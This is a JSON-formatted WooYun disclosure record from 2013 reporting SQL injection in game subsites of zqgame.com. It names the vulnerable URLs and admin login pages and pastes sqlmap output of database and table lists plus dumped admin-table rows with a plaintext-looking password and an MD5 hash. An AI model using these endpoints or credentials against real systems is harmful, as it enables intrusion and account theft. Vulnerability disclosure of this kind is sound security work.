{"id": 9264, "wybug_id": "wooyun-2013-027663", "wybug_title": "游戏服务商-中青宝网在线通杀漏洞 涉及几百万游戏用户哦", "wybug_corp": "zqgame.com", "wybug_author": "爱上平顶山", "wybug_date": "2013-07-04 08:09", "wybug_open_date": "2013-10-02 08:09", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "管理后台对外", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-10-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT.. 详细说明：  游戏服务商-中青宝网在线通杀漏洞为何叫通杀？  只要是中青宝网在线 的游戏分站 只要有Main/ListPage.aspx?type=news 或者Main/Tutorial.aspx?type=actmess这两个页面  都存在SQL诸如漏洞http://zgqxbk.zqgame.com/Main/ListPage.aspx?type=news 存在sql注入漏洞http://zgqx.zqgame.com/Main/Tutorial.aspx?type=actmess 存在sql注入漏洞不多说：一些后台：https://iaas.zqgame.com/http://ty.zqgame.com/login.aspxhttp://kf.zqgame.com/admin/adminLogin.do然后 SQLMAP :available databases [39]:                                                                              [*] Activity_bw_shipin[*] bwgamedb0419[*] bwsmDataTable[*] db_Activity[*] enterprise_stie[*] GameActivity[*] Help[*] helpdb[*] hydb[*] jwdb[*] jwgamedb[*] kangzhandb[*] kzwzgamedb[*] Lecture[*] Lj2gamedb[*] Ljgamedb[*] ltgamedb[*] master[*] mhshDB[*] mhshGH[*] model[*] Monitoring[*] msdb[*] NewxyGame[*] nh_gamedb[*] pdgwdb[*] qqgamedb[*] sd_ljdb[*] sggamedb[*] tempdb[*] ttttt[*] XwActivedb[*] XWgame[*] XWGhdb[*] xygameDB[*] zbxgamedb[*] zgqxdb[*] zgwzdb[*] zq_ads-------------------------------------------------------------------------------------------[22:53:06] [INFO] fetching current databasecurrent database:    ''database management system users [2]:                                                                  [*] sa[*] zgqx_login_db居然还有SA。。[22:54:49] [INFO] fetching current usercurrent user:    'zgqx_login_db'Database: zgqxdb                                                                                       [49 tables]+---------------------------+| dbo.BBS0525               || dbo.BBS052test            || dbo.Calendar0515          || dbo.ClientDown            || dbo.D99_Tmp               || dbo.IndexLink             || dbo.MediaActivities       || dbo.OfferqqCode20090703   || dbo.answer                || dbo.apply_20090605        || dbo.dtproperties          || dbo.gamecode              || dbo.gamecode0420          || dbo.ghtable0511           || dbo.hdperson0525          || dbo.ipaddress0420         || dbo.kz_Article            || dbo.kz_ArticleType        || dbo.kz_GameAction         || dbo.kz_GameActionTime     || dbo.kz_GameActionType     || dbo.kz_GameHero           || dbo.kz_LinkedPic          || dbo.kz_LinkedPicType      || dbo.kz_Manager            || dbo.kz_MessageBoard       || dbo.kz_OperationLog       || dbo.kz_PageTemplate       || dbo.kz_Picture            || dbo.kz_PictureType        || dbo.kz_Role               || dbo.kz_UserInRole         || dbo.kz_Vote               || dbo.kz_VoteLog            || dbo.offerorder_20091012   || dbo.offerqq20091012       || dbo.patch                 || dbo.pt_PlayerSerial       || dbo.qqcode20090703        || dbo.qqzuan20090720        || dbo.site                  || dbo.sysc                  || dbo.syscommand            || dbo.tc_num                || dbo.voteinfo0525          || dbo.winaccount0420        || dbo.zgqx_img_2011_11_03   || dbo.zgqx_info_2011_11_03  || dbo.zgqx_video_2011_11_03 |+---------------------------+Database: zgqxdb                                                                                       Table: dbo.kz_Manager[5 columns]+------------+----------+| Column     | Type     |+------------+----------+| createTime | datetime || ip         | char     || pwd        | varchar  || userId     | varchar  || userName   | nvarchar |+------------+----------+Database: zgqxdbTable: dbo.kz_Manager[2 entries]+----------+----------------------------------+----------+| userId   | pwd                              | userName |+----------+----------------------------------+----------+| zhanghua |          5152257                 | zhanghua || admin    | 9ccc21b7674b0fc274133ed66c40c196 | admin    |+----------+----------------------------------+----------+能跑出来的  不止这些  比如：Database: msdb                                                                                         [20 tables]+------------------------------------------------+| dbo.backupfile                                 || dbo.backupmediafamily                          || dbo.backupmediaset                             || dbo.backupset                                  || dbo.logmarkhistory                             || dbo.restorefile                                || dbo.restorefilegroup                           || dbo.restorehistory                             || dbo.suspect_pages                              || dbo.syspolicy_conditions                       || dbo.syspolicy_configuration                    || dbo.syspolicy_object_sets                      || dbo.syspolicy_policies                         || dbo.syspolicy_policy_categories                || dbo.syspolicy_policy_category_subscriptions    || dbo.syspolicy_policy_execution_history         || dbo.syspolicy_policy_execution_history_details || dbo.syspolicy_system_health_state              || dbo.syspolicy_target_set_levels                || dbo.syspolicy_target_sets                      |+------------------------------------------------+ok了吧     漏洞证明：  available databases [39]:                                                                              [*] Activity_bw_shipin[*] bwgamedb0419[*] bwsmDataTable[*] db_Activity[*] enterprise_stie[*] GameActivity[*] Help[*] helpdb[*] hydb[*] jwdb[*] jwgamedb[*] kangzhandb[*] kzwzgamedb[*] Lecture[*] Lj2gamedb[*] Ljgamedb[*] ltgamedb[*] master[*] mhshDB[*] mhshGH[*] model[*] Monitoring[*] msdb[*] NewxyGame[*] nh_gamedb[*] pdgwdb[*] qqgamedb[*] sd_ljdb[*] sggamedb[*] tempdb[*] ttttt[*] XwActivedb[*] XWgame[*] XWGhdb[*] xygameDB[*] zbxgamedb[*] zgqxdb[*] zgwzdb[*] zq_ads-------------------------------------------------------------------------------------------[22:53:06] [INFO] fetching current databasecurrent database:    ''database management system users [2]:                                                                  [*] sa[*] zgqx_login_db[22:54:49] [INFO] fetching current usercurrent user:    'zgqx_login_db'Database: zgqxdb                                                                                       [49 tables]+---------------------------+| dbo.BBS0525               || dbo.BBS052test            || dbo.Calendar0515          || dbo.ClientDown            || dbo.D99_Tmp               || dbo.IndexLink             || dbo.MediaActivities       || dbo.OfferqqCode20090703   || dbo.answer                || dbo.apply_20090605        || dbo.dtproperties          || dbo.gamecode              || dbo.gamecode0420          || dbo.ghtable0511           || dbo.hdperson0525          || dbo.ipaddress0420         || dbo.kz_Article            || dbo.kz_ArticleType        || dbo.kz_GameAction         || dbo.kz_GameActionTime     || dbo.kz_GameActionType     || dbo.kz_GameHero           || dbo.kz_LinkedPic          || dbo.kz_LinkedPicType      || dbo.kz_Manager            || dbo.kz_MessageBoard       || dbo.kz_OperationLog       || dbo.kz_PageTemplate       || dbo.kz_Picture            || dbo.kz_PictureType        || dbo.kz_Role               || dbo.kz_UserInRole         || dbo.kz_Vote               || dbo.kz_VoteLog            || dbo.offerorder_20091012   || dbo.offerqq20091012       || dbo.patch                 || dbo.pt_PlayerSerial       || dbo.qqcode20090703        || dbo.qqzuan20090720        || dbo.site                  || dbo.sysc                  || dbo.syscommand            || dbo.tc_num                || dbo.voteinfo0525          || dbo.winaccount0420        || dbo.zgqx_img_2011_11_03   || dbo.zgqx_info_2011_11_03  || dbo.zgqx_video_2011_11_03 |+---------------------------+Database: zgqxdb                                                                                       Table: dbo.kz_Manager[5 columns]+------------+----------+| Column     | Type     |+------------+----------+| createTime | datetime || ip         | char     || pwd        | varchar  || userId     | varchar  || userName   | nvarchar |+------------+----------+Database: zgqxdbTable: dbo.kz_Manager[2 entries]+----------+----------------------------------+----------+| userId   | pwd                              | userName |+----------+----------------------------------+----------+| zhanghua |          5152257                 | zhanghua || admin    | 9ccc21b7674b0fc274133ed66c40c196 | admin    |+----------+----------------------------------+----------+能跑出来的  不止这些  比如：Database: msdb                                                                                         [20 tables]+------------------------------------------------+| dbo.backupfile                                 || dbo.backupmediafamily                          || dbo.backupmediaset                             || dbo.backupset                                  || dbo.logmarkhistory                             || dbo.restorefile                                || dbo.restorefilegroup                           || dbo.restorehistory                             || dbo.suspect_pages                              || dbo.syspolicy_conditions                       || dbo.syspolicy_configuration                    || dbo.syspolicy_object_sets                      || dbo.syspolicy_policies                         || dbo.syspolicy_policy_categories                || dbo.syspolicy_policy_category_subscriptions    || dbo.syspolicy_policy_execution_history         || dbo.syspolicy_policy_execution_history_details || dbo.syspolicy_system_health_state              || dbo.syspolicy_target_set_levels                || dbo.syspolicy_target_sets                      |+------------------------------------------------+不放多了  游戏用户账号密码就不跑了  我不是脱裤的 。  你懂得。     修复方案：  你懂得。    求礼物 求大礼包、~   这个应该有吧？ 怎么说也几百万用户啊。。    版权声明：转载请注明来源 爱上平顶山@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-10-02 09:17 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @爱上平顶山 不好意思人家不理你 哈哈 还想要礼物 够不够坑    \n     2013-12-04 14:15 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @Mas  对于SB  不多说    \n     2013-12-08 14:17 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @爱上平顶山 这都忽略...厂商注重安全的还是很少啊    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}